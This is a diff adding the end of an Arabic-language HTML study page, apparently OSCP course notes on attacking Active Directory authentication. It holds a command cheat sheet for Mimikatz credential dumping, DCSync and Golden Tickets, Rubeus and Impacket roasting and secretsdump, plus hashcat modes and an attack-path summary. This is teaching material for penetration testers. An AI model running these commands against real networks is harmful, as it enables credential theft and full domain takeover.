+<div class="step-item">
+<div class="step-num">7</div>
+<div class="step-title">DCSync عند الوصول لصلاحيات DA أو Replication</div>
+<div class="step-body"><p>الهدف النهائي — تفريغ كل هاشات الدومين بما فيها KRBTGT، واللي بيفتح الباب لـ Golden Ticket وسيطرة كاملة ودائمة على الدومين.</p></div>
+</div>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ CHEAT SHEET -->
+<h2 id="cheat"><span class="htext">Cheat Sheet مرجعي</span></h2>
+<div class="cheat-section">
+
+<h4>أوامر Mimikatz الأساسية</h4>
+<div class="code-wrap"><span class="code-tag">mimikatz — quick reference</span><pre><code>privilege::debug
+token::elevate
+sekurlsa::logonpasswords
+sekurlsa::tickets /export
+lsadump::sam
+lsadump::dcsync /user:corp\krbtgt
+kerberos::golden /sid:&lt;SID&gt; /domain:&lt;domain&gt; /ptt /target:&lt;target&gt; /service:&lt;spn&gt; /rc4:&lt;hash&gt; /user:&lt;user&gt;
+kerberos::ptt &lt;ticket.kirbi&gt;
+</code></pre></div>
+
+<h4>أوامر Rubeus الأساسية</h4>
+<div class="code-wrap"><span class="code-tag">rubeus — quick reference</span><pre><code>Rubeus.exe brute /users:users.txt /password:&lt;pw&gt; /noticket /delay:500
+Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
+Rubeus.exe kerberoast /outfile:hashes.txt
+Rubeus.exe kerberoast /user:&lt;svc_account&gt; /outfile:hash.txt
+</code></pre></div>
+
+<h4>أوامر Impacket الأساسية</h4>
+<div class="code-wrap"><span class="code-tag">impacket — quick reference</span><pre><code>impacket-GetNPUsers corp.com/ -usersfile users.txt -format hashcat -outputfile hashes.txt
+impacket-GetUserSPNs corp.com/user:'PW' -request -outputfile hashes.txt
+impacket-secretsdump corp.com/jeffadmin:'PW'@dc1
+</code></pre></div>
+
+<h4>أوضاع Hashcat السريعة</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>Mode</th><th>النوع</th><th>الاستخدام</th></tr></thead>
+<tbody>
+<tr><td><code>1000</code></td><td>NTLM</td><td>تكسير هاشات NTLM المُستخرَجة مباشرةً</td></tr>
+<tr><td><code>18200</code></td><td>Kerberos 5 AS-REP etype23</td><td>نتائج AS-REP Roasting</td></tr>
+<tr><td><code>13100</code></td><td>Kerberos 5 TGS-REP etype23</td><td>نتائج Kerberoasting</td></tr>
+</tbody>
+</table></div>
+
+<h4>Quick Wins — أسرع المسارات في تقييم AD</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>#</th><th>التحقق</th><th>الأمر</th><th>الهجوم المناسب</th></tr></thead>
+<tbody>
+<tr><td>1</td><td>سياسة القفل تسمح بالـ Spray؟</td><td><code>net accounts /domain</code></td><td>Password Spraying</td></tr>
+<tr><td>2</td><td>حسابات بـ Pre-Auth معطّلة؟</td><td><code>Get-ADUser -Filter 'DoesNotRequirePreAuth -eq True'</code></td><td>AS-REP Roasting</td></tr>
+<tr><td>3</td><td>حسابات عندها SPNs؟</td><td><code>impacket-GetUserSPNs</code></td><td>Kerberoasting</td></tr>
+<tr><td>4</td><td>وصول Local Admin على أي جهاز؟</td><td><code>whoami /priv</code> + Mimikatz</td><td>LSASS Dump / Pass-the-Hash</td></tr>
+<tr><td>5</td><td>صلاحيات Replication متاحة؟</td><td><code>Get-ObjectAcl</code> على Domain Object</td><td>DCSync</td></tr>
+</tbody>
+</table></div>
+
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ SUMMARY -->
+<h2 id="summary"><span class="htext">الخلاصة العامة للموديول</span></h2>
+<p>الموديول ده غطّى مصادقة Active Directory من جذورها — بروتوكولَي NTLM وKerberos، أماكن تخزين بيانات الاعتماد في الذاكرة، وسلسلة كاملة من الهجمات اللي بتبدأ من حساب دومين عادي وتنتهي بالسيطرة الكاملة على الدومين عبر DCSync.</p>
+
+<div class="takeaways">
+<div class="takeaways-title">$ cat ./module20_summary.txt</div>
+<ul>
+<li>NTLM بيستخدم نموذج Challenge-Response — كلمة المرور مش بتعبر الشبكة، لكن الهاش نفسه قابل لإعادة الاستخدام والتكسير أوفلاين</li>
+<li>Kerberos بيستخدم نظام تذاكر (TGT → TGS) — أكثر أمانًا، لكن التذاكر نفسها أصبحت هدفًا للهجوم</li>
+<li>LSASS بيخزّن الهاشات وTGT وTGS في الذاكرة — استخراجها محتاج SYSTEM/Admin، لكن بمجرد التفريغ بيفتح الباب للحركة الجانبية الكاملة</li>
+<li>افحص سياسة القفل دايمًا قبل أي Password Spray — غلطة واحدة ممكن تقفل حسابات إنتاجية وتكشف التقييم بالكامل</li>
+<li>Spraying عبر طلبات Kerberos TGT هو الأسلوب الأكثر تخفّيًا — أثر شبكي أقل، وبدون لوجات خدمات</li>
+<li>AS-REP Roasting مش محتاج أي بيانات اعتماد — مجرد حساب واحد مُهيَّأ بشكل خاطئ يكفي لهجوم أوفلاين كامل</li>
+<li>Kerberoasting خطير لأن أي مستخدم دومين يقدر يطلب Service Tickets — وحسابات الخدمة غالبًا عندها كلمات مرور قديمة وضعيفة</li>
+<li>Silver Tickets بتتجاوز الـ KDC بالكامل — التذكرة المزوَّرة مقبولة لأن الخدمة بتثق في هاشها الخاص من غير تحقق خارجي</li>
+<li>DCSync هو أخطر هجوم في الموديول — حساب DA واحد يكفي لتفريغ كل بيانات اعتماد الدومين بما فيها KRBTGT</li>
+</ul>
+</div>
+
+<blockquote>
+<p><strong>كل هجمات المصادقة دي مبنية على فكرة واحدة:</strong> الثقة الممنوحة لهاش أو تذكرة أكبر من الثقة المفروض تتحقق منها فعليًا. المختبر اللي بيفهم أين بالظبط بتتولَّد هذه الثقة — وأين بيُفترَض إنها تتحقَّق ومش بتتحقَّق — هو اللي بيوصل لـ Domain Admin بأقل عدد خطوات.</p>
+</blockquote>
+
+<div class="callout examtip">
+<div class="callout-label">Professional Mindset</div>
+<p>في الـ Engagement الحقيقي: ابدأ دايمًا بالهجمات اللي مش محتاجة بيانات اعتماد أو بتتم أوفلاين (Password Spraying، AS-REP Roasting) → بعدين Kerberoasting باستخدام أول حساب تحصل عليه → بعدين استغلال LSASS على أي جهاز فيه Local Admin → وأخيرًا، لو وصلت لصلاحيات DA، نفّذ DCSync واحفظ حساب KRBTGT تحديدًا — لأنه بيفتح الباب لاستمرارية الوصول (Golden Ticket). وثَّق كل خطوة، حتى الفاشلة.</p>
+</div>
+
+<hr />
+<p><em>نهاية نوتس الموديول العشرين — Attacking Active Directory Authentication</em></p>
+<div class="footer-note">-- EOF: module-20/ad-authentication.md --</div>
+
+</div>
+
+<script>
+(function(){
+  var root=document.documentElement,btn=document.getElementById('themeSwitch');
+  function applyTheme(t){root.setAttribute('data-theme',t);btn.textContent='theme: '+t;try{localStorage.setItem('oscp-notes-theme',t);}catch(e){}}
+  var saved='dark';try{saved=localStorage.getItem('oscp-notes-theme')||'dark';}catch(e){}
+  applyTheme(saved);
+  btn.addEventListener('click',function(){applyTheme(root.getAttribute('data-theme')==='dark'?'light':'dark');});
+  var bar=document.getElementById('progressBar');
+  function onScroll(){var h=document.documentElement,s=h.scrollTop,ht=h.scrollHeight-h.clientHeight;bar.style.width=(ht>0?(s/ht*100):0)+'%';var t=document.getElementById('toTop');s>500?t.classList.add('show'):t.classList.remove('show');}
+  document.addEventListener('scroll',onScroll);onScroll();
+  document.getElementById('toTop').addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+  document.querySelectorAll('.code-wrap').forEach(function(wrap){
+    var c=wrap.querySelector('code');if(!c)return;
+    var b=document.createElement('button');b.className='copy-btn';b.textContent='copy';
+    b.addEventListener('click',function(){if(navigator.clipboard){navigator.clipboard.writeText(c.innerText).then(function(){b.textContent='copied ✓';b.classList.add('copied');setTimeout(function(){b.textContent='copy';b.classList.remove('copied');},1500);});}});
+    wrap.appendChild(b);
+  });
+})();
+</script>
+</body>
+</html>
